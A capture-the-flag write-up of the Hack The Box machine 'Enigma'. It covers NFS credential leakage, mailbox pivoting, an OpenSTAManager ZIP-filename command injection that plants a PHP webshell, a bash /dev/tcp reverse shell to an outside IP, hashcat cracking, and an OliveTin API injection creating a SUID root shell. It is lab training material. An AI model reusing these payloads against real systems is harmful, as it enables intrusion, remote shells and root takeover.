---
slug: "hackthebox/machines/htb-enigma"
event: "hack-the-box-machines"
title: "HTB Enigma Writeup"
summary: "Linux writeup covering NFS onboarding credential leakage, mailbox pivoting, OpenSTAManager authenticated command injection, bcrypt cracking, and OliveTin local API privilege escalation."
date: 2026-06-29
tags:
  - htb
  - linux
  - nfs
  - mail
  - command-injection
  - openstamanager
  - hashcat
  - olivetin
  - privilege-escalation
category: "hack-the-box"
difficulty: "info"
platform: "hackthebox"
draft: false
---

# Hack The Box - Enigma Writeup

## Machine Overview

**Machine:** Enigma
**OS:** Linux / Ubuntu
**Attack path:** Exposed NFS leaked onboarding mail credentials. Mail pivoting exposed OpenSTAManager admin access. OpenSTAManager 2.9.8 was abused through authenticated `.p7m` ZIP filename command injection to get `www-data`. Database credentials leaked Haris’ bcrypt hash, which cracked to `bestfriends`. Root was obtained by abusing a locally exposed OliveTin API action running as root.

Flags:

```text
user.txt: 1a8d17c8660adf346a2e0c7653c42e2a
root.txt: 6d2e6fffb09e80590982247a22d98f50
```

![Screenshot 2026 06 29 035157](/images/writeups/hackthebox/enigma/screenshot-2026-06-29-035157.png)

---

## 1. Enumeration

I started with basic connectivity and full TCP enumeration.

```bash
IP=10.129.6.37
echo "$IP enigma.htb" | sudo tee -a /etc/hosts

sudo nmap -Pn -p- --min-rate 5000 -oA scans/all $IP
ports=$(grep -oP '\d+/open' scans/all.gnmap | cut -d/ -f1 | paste -sd, -)
sudo nmap -Pn -sCV -p$ports -oA scans/services $IP
```

Important ports:

```text
22/tcp    OpenSSH
80/tcp    nginx
110/tcp   POP3 Dovecot
143/tcp   IMAP Dovecot
993/tcp   IMAPS Dovecot
995/tcp   POP3S Dovecot
111/tcp   rpcbind
2049/tcp  NFS
```

### Decision Making

The target exposed HTTP and mail, but mail usually requires credentials. NFS was more immediately interesting because anonymous or weakly protected NFS shares often leak documents, backups, SSH keys, or onboarding material. Since `2049/tcp` and RPC/mountd were open, I prioritized NFS before deeper web fuzzing.

---

## 2. NFS Enumeration

```bash
showmount -e $IP

sudo nmap -Pn -p111,2049,35595,45149,56613 \
--script nfs-showmount,nfs-ls,nfs-statfs \
-oA scans/nfs $IP
```

The export was:

```text
/srv/nfs/onboarding *
```

I mounted it:

```bash
mkdir -p loot/nfs
sudo mount -t nfs -o vers=3,nolock $IP:/srv/nfs/onboarding loot/nfs
ls -la loot/nfs
```

The share contained:

```text
New_Employee_Access.pdf
```

I extracted the PDF text:

```bash
cp loot/nfs/New_Employee_Access.pdf loot/
pdftotext loot/New_Employee_Access.pdf loot/New_Employee_Access.txt
cat loot/New_Employee_Access.txt
```

Credentials found:

```text
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

### Decision Making

The PDF looked like an onboarding document, and the filename matched the “new employee” theme. Since the credentials were specifically for webmail, I shifted from NFS to mail enumeration.

---

## 3. Mail Access

Added the mail vhost:

```bash
echo "$IP mail001.enigma.htb" | sudo tee -a /etc/hosts
curl -i http://mail001.enigma.htb/
```

The web app was Roundcube. I also tested IMAPS directly:

```bash
openssl s_client -connect mail001.enigma.htb:993 -crlf -quiet
```

IMAP commands:

```text
A001 LOGIN kevin "Enigma2024!"
A002 LIST "" "*"
A003 SELECT INBOX
A004 FETCH 1:* BODY.PEEK[]
A005 LOGOUT
```

Kevin had one email from Sarah. The important clue was:

```text
You should be receiving your access credentials shortly via the company shared drive.
```

This confirmed the NFS share was part of the intended path. I also tested SSH password reuse:

```bash
ssh kevin@enigma.htb
```

Result:

```text
Permission denied (publickey).
```

### Decision Making

SSH was publickey-only, so password reuse against SSH was dead. The email exposed `sarah@enigma.htb`, and since Kevin’s password looked like a generic onboarding password, I tested the same password against Sarah’s mailbox rather than brute-forcing.

---

## 4. Sarah Mailbox Pivot

```bash
openssl s_client -connect mail001.enigma.htb:993 -crlf -quiet
```

```text
A001 LOGIN sarah "Enigma2024!"
A002 LIST "" "*"
A003 SELECT INBOX
A004 FETCH 1:* BODY.PEEK[]
A005 LOGOUT
```

Sarah’s inbox contained OpenSTAManager credentials:

```text
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

Added the vhost:

```bash
echo "$IP support_001.enigma.htb" | sudo tee -a /etc/hosts
curl -i http://support_001.enigma.htb/
```

The app was OpenSTAManager. Static assets revealed:

```text
?v=2.9.8
```

### Decision Making

At this point, I had authenticated admin access to a known web application with a visible version. This is where checking known authenticated vulnerabilities became useful. Before exploiting, I tried an SQLi test against `ajax_complete.php`, but the time-based payload did not trigger. That pushed me toward another known weakness in this version: P7M ZIP filename command injection.

---

## 5. Foothold — OpenSTAManager CVE-2025-69212

OpenSTAManager 2.9.8 is vulnerable to authenticated OS command injection in P7M signed XML processing. The vulnerable flow processes filenames from a ZIP upload. By breaking out of the quoted filename context, commands can be executed as the web user.

I created a malicious ZIP that wrote a PHP webshell into the exposed `files/` directory:

```bash
cd ~/Desktop/01_CTF/HackTheBox/Machines/Enigma/loot/p7m
rm -f exploit.zip

python3 - <<'PY'
import zipfile
cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
name = f'invoice.p7m";{cmd};echo ".p7m'
with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr(name, b"DUMMY_P7M_CONTENT")
print(name)
PY

zipinfo -1 exploit.zip
```

Uploaded it to:

```text
http://support_001.enigma.htb
Importazione FE / electronic invoice import
```

The app returned:

```text
Start tag expected, '<' not found
```

This error was misleading. It happened after the command executed, because the uploaded file was not valid XML.

I confirmed the webshell:

```bash
curl 'http://support_001.enigma.htb/files/SHELL.php?c=id'
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then I got a reverse shell:

```bash
nc -lvnp 4444
```

```bash
curl --get 'http://support_001.enigma.htb/files/SHELL.php' \
--data-urlencode 'c=bash -c "bash -i >& /dev/tcp/10.10.15.33/4444 0>&1"'
```

Stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

---

## 6. Post-Exploitation as `www-data`

I enumerated the web root:

```bash
id
hostname
pwd
ls -la /var/www/html
ls -la /var/www/html/openstamanager
```

The OpenSTAManager config contained database credentials:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

Found:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

### Decision Making

After web RCE, the next logical target was application configuration. PHP apps commonly store database credentials in config files. Database access often exposes password hashes, reset tokens, API tokens, mail accounts, or internal notes.

---

## 7. Database Enumeration

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e 'show tables;'
```

Dumped users and tokens:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "
select id,username,email,password,enabled from zz_users;
select * from zz_tokens;
select * from em_accounts;
select * from zz_oauth2;
"
```

Important rows:

```text
admin  admin@enigma.htb  bcrypt hash
haris  haris@enigma.htb  bcrypt hash
```

I copied the hashes to Kali:

```bash
cat > hashes.txt <<'EOF'
admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
EOF
```

Cracked with Hashcat:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --username -O -w 3
hashcat -m 3200 hashes.txt --username --show
```

Result:

```text
haris:bestfriends
```

Switched user:

```bash
su haris
# password: bestfriends
```

User flag:

```bash
cd
cat user.txt
```

```text
1a8d17c8660adf346a2e0c7653c42e2a
```

### Decision Making

SSH still rejected passwords because it required public keys, but `su` worked locally. This is a common difference: SSH authentication policy does not always match local PAM authentication.

---

## 8. Privilege Escalation — OliveTin

While enumerating from `www-data`, I noticed `/var/www/olivetin` and a local service:

```bash
ps auxww | grep -i '[o]livetin'
ss -lntp | grep -E '1337|olivetin'
find /etc /opt /var/www -iname '*olivetin*' -o -name 'config.yaml' 2>/dev/null
cat /etc/OliveTin/config.yaml
```

Findings:

```text
/usr/local/bin/OliveTin running as root
127.0.0.1:1337 listening locally
authRequireGuestsToLogin: false
defaultPermissions:
  exec: true
```

The dangerous action:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

The API was reachable locally:

```bash
curl -s http://127.0.0.1:1337/api/StartAction \
--json '{"bindingId":"date"}'
```

Returned:

```json
{"executionTrackingId":"..."}
```

### Decision Making

OliveTin was running as root and allowed unauthenticated local action execution. The `backup_database` action placed the `db_pass` argument inside a shell command. Since the argument type was `password`, this matched the unsafe argument class from CVE-2026-27626. The best payload was to inject shell metacharacters and create a SUID root bash.

Exploit:

```bash
curl -s http://127.0.0.1:1337/api/StartAction \
--json '{
"bindingId":"backup_database",
"arguments":[
{"name":"db_user","value":"backup_svc"},
{"name":"db_pass","value":"x'\'';cp /bin/bash /tmp/rootbash;chmod 4755 /tmp/rootbash;#"},
{"name":"db_name","value":"production"}
]}'
```

Checked the payload:

```bash
ls -l /tmp/rootbash
```

Output:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Executed root shell:

```bash
/tmp/rootbash -p -c 'id; whoami; cat /root/root.txt'
```

Output:

```text
uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
root
6d2e6fffb09e80590982247a22d98f50
```

---

## Attack Chain Summary

```text
NFS exposed
→ onboarding PDF leaked kevin mail credentials
→ kevin mailbox revealed Sarah and shared-drive clue
→ Sarah reused onboarding password
→ Sarah mailbox leaked OpenSTAManager admin creds
→ OpenSTAManager 2.9.8 vulnerable to authenticated P7M ZIP filename command injection
→ www-data shell
→ config.inc.php leaked MySQL creds
→ DB contained Haris bcrypt hash
→ hashcat cracked Haris password: bestfriends
→ su haris
→ OliveTin local API running as root with guest exec enabled
→ backup_database password argument command injection
→ SUID root bash
→ root flag
```

---

## Key Takeaways

- NFS shares should be checked early when exposed with RPC/mountd.

- Onboarding documents often contain high-value initial credentials.

- Mailboxes are strong pivot points because they expose internal usernames, services, and support workflows.

- SSH password reuse may fail when SSH is publickey-only, but local `su` may still work.

- Versioned static assets can identify vulnerable application versions.

- OpenSTAManager’s XML parse error did not mean exploit failure; command execution happened before parsing failed.

- Application config files are high-value post-exploitation targets.

- Local-only services are still exploitable after foothold.

- OliveTin actions running as root are dangerous when guest execution and unsafe shell interpolation are enabled.
